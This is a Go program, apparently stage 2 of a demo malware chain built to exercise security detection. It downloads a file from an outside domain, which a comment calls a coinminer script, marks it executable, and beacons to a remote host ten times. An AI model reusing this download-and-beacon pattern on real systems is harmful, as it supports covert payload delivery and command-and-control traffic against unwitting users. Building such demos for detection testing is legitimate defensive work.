package main

import (
	"log"
	"os"
	"time"
)

func main() {
	const domain = "lwmalwaredemo.com"
	//const domain = "localhost:8081"
	const host = "lacework.ddns.net"
	//const host = "localhost:8080"
	const filename = "install-demo-1.sh"
	const postUrl = "http://" + host + "/lw-beacon"
	const getUrl = "http://" + domain + "/" + filename
	var body = []byte(`{"stage":"2"}`)

	f := setupLogger("lw-stage-2.log")
	defer func(f *os.File) {
		_ = f.Close()
	}(f)
	log.SetOutput(f)
	log.Println("Stage 2 started")

	// download coinminer script
	log.Println("Downloading file: " + getUrl)
	getErr := httpGet(getUrl, filename)
	if getErr != nil {
		log.Println("Error downloading file", getErr)
		panic(getErr)
	}

	// make file executable
	chmodErr := os.Chmod(filename, 0777)
	if chmodErr != nil {
		log.Println("Error changing permissions", chmodErr)
		panic(chmodErr)
	}
	log.Println("Finished changing permissions for stage 2")

	//wait a few seconds then terminate
	time.Sleep(10 * time.Second)

	// beacon home every 60 seconds 10 times
	for i := range 10 {
		postErr := httpPost(postUrl, body)
		if postErr != nil {
			log.Println("Error posting beacon to API", postErr)
			panic(postErr)
		}
		log.Printf("Sending stage 2 beacon back to API: %d\n", i+1)
		time.Sleep(60 * time.Second)
	}
	log.Println("Completed. Terminating.")
}
